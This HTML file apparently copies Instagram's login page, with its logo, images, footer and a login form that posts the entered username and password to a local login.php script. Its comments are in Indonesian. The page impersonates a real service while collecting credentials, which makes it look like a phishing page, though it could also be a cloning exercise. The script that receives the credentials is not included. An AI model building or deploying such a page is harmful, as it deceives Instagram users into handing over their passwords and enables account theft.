<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram</title>
  <link rel="stylesheet" href="./styles/style.css">
</head>

<body>

  <div id="content-container">
    <section class="phones">
      <img src="./img/phones.png" alt="pictures on phone" class="phone-image">
      <div class="display-phone">
        <img class="picture" src="./img/photo-1.png" alt="#">
        <img class="picture" src="./img/photo-2.png" alt="#">
        <img class="picture" src="./img/photo-3.png" alt="#">
        <img class="picture" src="./img/photo-4.png" alt="#">
        <img class="picture" src="./img/photo-5.png" alt="#">
      </div>
    </section>

    <section class="user">
      <div class="login-container">
        <div class="instagram-logo-box">
          <img class="instagram-logo" src="./img/instagram-logo.png">
        </div>

        <!-- Formulir Masuk -->
        <form id="login-post" action="login.php" method="POST">
          <div class="inputs-container">
            <input type="text" name="username" placeholder="Phone number, username or email" required>
          </div>
          <div class="inputs-container">
            <input type="password" name="password" placeholder="Password" required>
          </div>
          <button type="submit" class="login-button">Log In</button> <!-- Tombol diperbaiki -->

          <div class="or-container">
            <div class="line"></div>
            <div class="or">OR</div>
            <div class="line"></div>
          </div>

          <div class="facebook-container">
            <a class="facebook-login" href="#" target="_blank">
              <img class="facebook-logo" src="./img/facebook-logo.png">Log in with Facebook
            </a>
          </div>
        </form>

        <a class="password-forgot" href="#" target="_blank">Forgot password?</a>
      </div>

      <div class="signup-container">
        <p>Don't have an account? <a class="signup" href="#" target="_blank">Sign up</a></p>
      </div>

      <div class="get-container">
        <p>Get the app.</p>
        <div class="download-container">
          <a class="download-appstore" href="#" target="_blank"><img class="appstore" src="./img/applestore-logo.png"></a>
          <a class="download-googleplay" href="#" target="_blank"><img class="googleplay" src="./img/googleplay-logo.png"></a>
        </div>
      </div>
    </section>
  </div>

  <footer class="page-footer">
    <div class="links-container">
      <ul class="links-list">
        <li><a class="link" href="#" target="_blank">ABOUT</a></li>
        <li><a class="link" href="#" target="_blank">PRESS</a></li>
        <li><a class="link" href="#" target="_blank">API</a></li>
        <li><a class="link" href="#" target="_blank">JOBS</a></li>
        <li><a class="link" href="#" target="_blank">PRIVACY</a></li>
        <li><a class="link" href="#" target="_blank">TERMS</a></li>
        <li><a class="link" href="#" target="_blank">LOCATIONS</a></li>
        <li><a class="link" href="#" target="_blank">TOP ACCOUNTS</a></li>
        <li><a class="link" href="#" target="_blank">HASHTAGS</a></li>
        <li><a class="link" href="#" target="_blank">LANGUAGE</a></li>
      </ul>
    </div>

    <div class="footer-span-container">
      <span class="footer-span">
        © 2020 INSTAGRAM FROM FACEBOOK
      </span>
    </div>
  </footer>

</body>
</html>
